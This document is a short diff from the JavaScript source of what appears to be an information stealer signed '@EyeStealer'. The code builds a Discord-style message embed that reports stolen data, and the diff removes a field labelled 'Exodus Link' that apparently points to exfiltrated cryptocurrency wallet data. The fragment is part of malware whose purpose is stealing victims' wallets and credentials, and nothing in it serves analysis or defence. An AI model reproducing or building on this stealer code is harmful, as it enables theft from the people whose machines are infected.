@@ -529,12 +529,6 @@ const os = require("os");
                     value: `\`\`\`ansi
 [2;31m ${e ?? "N/A"}[0m[2;34m[0m\`\`\``,
                     inline: false,
-                },
-                {
-                    name: "<:green_link:1133348228029497475>  **Exodus Link:**",
-                    value: `\`\`\`ansi
-[2;31m h$link[0m[2;34m[0m\`\`\``,
-                    inline: false,
                 }],
                 footer: {
                   text: "@EyeStealer",
